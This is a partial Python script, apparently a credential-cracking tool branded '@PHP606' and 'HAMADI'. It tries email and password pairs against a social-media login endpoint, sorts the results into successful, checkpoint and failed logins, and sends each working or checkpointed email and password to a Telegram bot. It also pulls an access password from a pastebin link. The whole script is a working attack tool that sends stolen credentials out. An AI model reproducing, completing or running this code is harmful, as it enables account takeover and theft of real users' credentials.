...
def login():
	re = requests.get("https://pastebin.com/raw/d7b9qezV")
	print (HAMADIa)
	...
	if password in str(re.text):
	  ...
	  os.system('xdg-open https://t.me/PHP606/1')
	  sys.exit()
	os.system('clear')
#------------------------------------------------------------------------------------------------------------------------0
def HAMADIELEzz(username,pas):
	...
	time.sleep(1)
	requests.post("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text=⁦⌯  Hi HAMADI Successful 💯 ⌯\n — — — — —  — — — — — . \n.✥. E𝗆𝖺𝗂𝗅  :"+ Email+"\n.✥. Pass  : "+ pas+"\n.✥. User  : "+username+"\n.✥. Follwers : "+followers+"\n.✥. Foolowing : "+following+"\n.✥. Post : "+posts+"\n⌯"+tt+"\n. — — — — —  — — — — —\n• Tele : @PHP606 .")
#------------------------------------------------------------------------------------------------------------------------0
...
def main():
	...
	tt=time.asctime()
	r = requests.session()
	global EGYPT , token , ID , Email , start_msg , id_msg , Ok , Cp , Sk , pas , username
	print(EGYPT)
	...
	while True:
		...
		if 'logged_in_user' in req.json():
			...
			HAMADIELEzz(username,pas)
		
		elif '"message":"challenge_required","challenge"' in req.json():
			Cp+=1
			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= ⌯  Hi HAMADI Checkpoint 🔐⁦ ⌯\n — — — — —  — — — — — . \n\n.✥. E𝗆𝖺𝗂𝗅 📧 : {Email}\n\n.✥. PASS 🔐 : {pas}\n\n⌯ {tt}  \n\n. — — — — —  — — — — —\n• Tele : @PHP606 .")
		else:
			Sk+=1
			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Ok}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Sk}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {Email} ← ]\n\n.✥. PASS 🔐 : [ → {pas} ← ]\n-----------------------------------------\n.✥.CH : @PHP606")
